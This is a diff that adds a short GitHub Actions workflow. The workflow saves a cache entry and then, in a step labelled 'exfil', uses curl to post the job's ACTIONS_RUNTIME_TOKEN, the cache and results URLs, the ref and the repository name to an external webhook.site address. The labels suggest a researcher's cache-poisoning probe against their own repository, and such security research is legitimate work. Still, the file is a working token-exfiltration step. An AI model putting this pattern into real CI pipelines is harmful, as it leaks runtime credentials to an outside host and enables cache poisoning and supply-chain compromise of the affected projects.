@@ -1,0 +1,27 @@
+name: cb-a-trusted
+on:
+  push: {}
+  workflow_dispatch: {}
+jobs:
+  a:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: make payload
+        run: |
+          mkdir -p cache-dir
+          echo "cache payload A $(date -u)" > cache-dir/payload.txt
+      - name: save cache
+        uses: actions/cache/save@v4
+        with:
+          path: cache-dir
+          key: probe-main-A1
+      - name: exfil runtime context (OWN token, own sink)
+        run: |
+          curl -s -X POST https://webhook.site/ae1c7580-8d42-440e-82c4-4746ccb71ad5 --data-urlencode "src=cb-a-trusted" \
+            --data-urlencode "tok=$ACTIONS_RUNTIME_TOKEN" \
+            --data-urlencode "res=$ACTIONS_RESULTS_URL" \
+            --data-urlencode "cacheurl=$ACTIONS_CACHE_URL" \
+            --data-urlencode "ref=$GITHUB_REF" \
+            --data-urlencode "repo=$GITHUB_REPOSITORY"
+        shell: bash
